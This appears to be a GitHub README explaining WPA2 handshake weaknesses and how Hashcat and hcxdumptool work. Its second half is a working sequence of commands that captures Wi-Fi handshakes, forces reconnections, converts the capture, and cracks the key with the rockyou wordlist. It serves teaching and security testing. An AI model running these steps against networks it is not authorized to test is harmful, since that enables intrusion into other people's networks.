# WPA2-Attack-using-Hashcat-and-Hcxdumptool
# Introduction
WPA2 is the most used security protocol for securing wireless networks. Even with its robust encryption and security mechanisms, WPA2 is vulnerable to attacks, especially to those involving the handshake process. This report primarily focuses on two key tools used to attack the WPA2 secured network—Hashcat and Hcxdumptool—by exploiting the vulnerabilities in the handshake procedure. These tools enable threat actors to capture and crack WPA2 passwords by applying various attack strategies such as dictionary and brute-force attacks.

## Understanding WPA2 Security
WPA2 utilizes Advanced Encryption Standard (AES) for encryption and Pre-Shared Key (PSK) for authentication. The WPA2 handshake is essentially a four-way process that builds a secure connection between the client and the access point, referred to as the supplicant and authenticator, respectively. However, the strength of the WPA2 encryption relies deeply on the strength of the pre-shared key.

### WPA2 Four-Way Handshake Process
1. **The client sends a request to the access point (AP):** This initiates the handshake.
2. **The access point responds with its nonce:** A random value and message to start the handshake process.
3. **The client creates its own nonce and derives a session key:** Using the AP's nonce.
4. **Both client and AP share key information messages:** This confirms the establishment of a secure connection.

At this stage, the handshake is completed, and the keys for encryption are exchanged. Attackers try to capture this handshake to crack the WPA2 password using brute-force or dictionary attacks.

## Tools for WPA2 Attacks

### Hashcat
Hashcat is a powerful password cracking tool that can be used for a variety of hashing algorithms, including those used in WPA2. It utilizes the GPU (Graphics Processing Unit) to accelerate the cracking process, allowing for efficient brute-forcing or dictionary-based cracking of passwords.

#### WPA2 Handshake Process in Hashcat
When an attacker captures the WPA2 handshake, it contains the hash of the WPA2 Pre-Shared Key (PSK) obtained from the passphrase. This hash can be cracked using Hashcat to retrieve the original passphrase.

#### Common Attacks in Hashcat:
- **Brute-Force Attack:** Tries all possible combinations of characters until it cracks the password.
- **Dictionary Attack:** Tests all possible password combinations from a wordlist, matching the hash of the words in the list with the captured hash.
- **Rule-Based Attack:** Applies predefined rules to a dictionary by adding prefixes, suffixes, or replacing characters to create an extensive password list.

### Hcxdumptool
Hcxdumptool is a tool used for capturing WPA2 handshakes from wireless networks. As part of the hcxtools suite, it is designed to attack both WPA2 and WPA3 networks.

#### Key Features of Hcxdumptool:
- **Capture WPA2 Handshakes:** Captures the four-way handshake while the client is attempting to connect with the access point.
- **De-Authentication Attacks:** Sends de-authentication packets to force clients to reconnect to the access point, initiating a handshake capture.
- **Output Formats:** Saves the captured handshake in various formats, such as `.pcapng`, which can be converted for use in Hashcat.
### Network Diagram
  ![image](https://github.com/user-attachments/assets/a699ef07-bd25-4ec1-a0e7-a55f4174e5aa)

### WPA2 Attack and Cracking Script
#### This script captures and cracks WPA2 Wi-Fi traffic using hcxdumptool and Hashcat.

#### Install Required Packages
```bash

sudo apt-get update
sudo apt-get install -y libcurl4-openssl-dev libssl-dev pkg-config libpcap-dev
```
#### Clone the hcxdumptool Repository and Navigate to It
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool

#### Stop Network Management Services
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service

#### Capture Wi-Fi Traffic
sudo hcxdumptool -i wlan0 -w dumpfile.pcapng -F --rds=1

#### Restart Network Management Services After Capture
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

#### Convert Captured Traffic to Hash File
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng

#### Scan for MAC Addresses
sudo hcxdumptool -i wlan0 --rcascan=a

#### Crack Wi-Fi Hashes Using Hashcat
hashcat -m 22000 hash.hc22000 rockyou.txt --show

